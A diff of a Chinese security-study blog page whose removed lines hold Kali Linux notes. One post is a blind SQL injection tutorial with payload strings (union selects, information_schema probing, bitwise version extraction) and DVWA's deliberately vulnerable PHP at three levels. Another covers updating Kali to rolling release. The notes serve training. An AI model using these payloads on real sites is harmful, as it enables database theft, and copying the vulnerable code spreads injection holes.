-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  763 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-判断技术"><a href="#1-判断技术" class="headerlink" title="1. 判断技术"></a>1. 判断技术</h4><ul>
-<li>不显示数据库内建的报错信息<ul>
-<li>内建的报错信息帮助开发人员发现和修复问题</li>
-<li>报错信息提供关于系统的大量有用信息</li>
-</ul>
-</li>
-<li>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，即为盲注</li>
-<li>思路：既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断<ul>
-<li>1’ and 1=1–+</li>
-<li>1’ and 1=2–+</li>
-<li>1’ order by 5–+  假</li>
-<li>1’ order by 2–+  真</li>
-<li>1’ union select 1,2–+</li>
-<li>1’ union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())–+</li>
-<li>1’ and 1=0 union select null,table_name from information_schema.tables#</li>
-<li>1’ and 1=0 union selcet null,table_name from information_schema.colums where table_name=’users’#</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-猜字段–无information-scheme"><a href="#2-猜字段–无information-scheme" class="headerlink" title="2. 猜字段–无information_scheme"></a>2. 猜字段–无information_scheme</h4><ul>
-<li>无权读取information_shcema库/拒绝union、order by语句<ul>
-<li>猜列名：1’ and user is not null–+</li>
-<li>猜当前表名：1’ and table.user is not null–+</li>
-<li>猜库里其他表：1’ and (select count() from table)&gt;0–+</li>
-<li>列表对应关系：1’ and users.user is not null–+</li>
-<li>猜字段内容：1’ and user=’admin’/1’ or user like ‘%a’</li>
-<li>猜账号对应密码：2’ or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99</li>
-<li>▲ Burpsuite自动化猜解内容</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-真实实例"><a href="#3-真实实例" class="headerlink" title="3. 真实实例"></a>3. 真实实例</h4><ul>
-<li>开个脑洞<ul>
-<li>真实案例：某电商网站</li>
-<li><a href="http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123" target="_blank" rel="noopener">http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123</a></li>
-<li>and 1=1–+  显示一包面巾纸</li>
-<li>and 1-2–+  显示一袋洗衣粉</li>
-<li>1’ and ORD(MID((VERSION()),1,1))&amp;（1/2/4/8/16/32/64/128）&gt;0–+</li>
-<li>CURRENT_USER()、DATABASE()</li>
-<li>MID用法：MID(ColumnName,Start [,Length])</li>
-<li>ORD用法：ORD(string)   #ASCII码</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-DVWA的SQL盲注源码"><a href="#4-DVWA的SQL盲注源码" class="headerlink" title="4. DVWA的SQL盲注源码"></a>4. DVWA的SQL盲注源码</h4><ul>
-<li>DVWA的SQL Injection(Blind) Source（Low）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">    // Retrieve data</span><br><span class="line">    </span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">    $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line"></span><br><span class="line">    $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的SQL Injection(Blind) Source（Medium）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;</span><br><span class="line">    $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line">    </span><br><span class="line">    $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">    $i=0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first=mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last=mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的SQL Injection(Blind) Source（High）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Submit&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    if (is_numeric($id)) &#123;</span><br><span class="line"></span><br><span class="line">        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line"></span><br><span class="line">        $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">        $i=0;</span><br><span class="line"></span><br><span class="line">        while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">            $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">            </span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/" itemprop="url">Kali Linux笔记(四十八)：Kali Linux版本更新--rolling</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:11:35+08:00">
-                2020-01-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  232 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Kali-Linux版本更新–第一个Rolling-RELEASE"><a href="#1-Kali-Linux版本更新–第一个Rolling-RELEASE" class="headerlink" title="1. Kali Linux版本更新–第一个Rolling RELEASE"></a>1. Kali Linux版本更新–第一个Rolling RELEASE</h4><ul>
-<li>Kali 2.0发布时声称将采用rolling release模式更新（但并未实施）</li>
-<li>Fixed-release<ul>
-<li>固定发布周期</li>
-<li>使用软件稳定的主流版本（发布–主流–作废）</li>
-<li>更稳定，适合于企业生成环境</li>
-</ul>
-</li>
-<li>Rolling release<ul>
-<li>适用于开发者和技术人员</li>
-<li>连续升级新版本，追求在新功能出现后最快使用</li>
-<li>正式成为流行</li>
-</ul>
-</li>
-<li>Kali 2.0 rolling release<ul>
-<li>采用debian testing库作为更新源</li>
-</ul>
-</li>
-<li>软件包追踪<ul>
-<li><a href="https://pkg.kali.org/" target="_blank" rel="noopener">https://pkg.kali.org/</a></li>
-</ul>
-</li>
-<li>VMware Tools vs Open-VM-Tools<ul>
-<li><strong><code>🔺命令：apt-get install open-vm-tools-desktop fuse</code></strong></li>
-</ul>
-</li>
-<li>Gnome 3.18</li>
-<li>4.3内核</li>
-<li>Kali 2.0现有版本升级</li>
-</ul>
-<blockquote>
-<pre><code>⭐现有版本更新
-cat &lt;&lt; EOF &gt; /etc/apt/sources.list
-deb http://http.kali.org/kali kali-rolling main non-free contrib
-EOF
-
-⭐安装命令
-apt-get update
-apt-get dist-upgrade 
-reboot
-
-⭐查看版本号，代码号
-lsb_release -a</code></pre></blockquote>
-<ul>
-<li>Kali sana库于2016年4月15日停止更新</li>
-<li>工具有所更新</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/11/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/13/">Next</a>
+    <a class="extend prev" rel="prev" href="/page/11/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/13/">Next</a>
   </nav>
 
 
@@ -3714,7 +3623,7 @@ lsb_release -a</code></pre></blockquote>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">173</span>
+                  <span class="site-state-item-count">181</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3821,7 +3730,7 @@ lsb_release -a</code></pre></blockquote>
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">172.8k</span>
+    <span title="Site words total count">176.3k</span>
   
 </div>
 
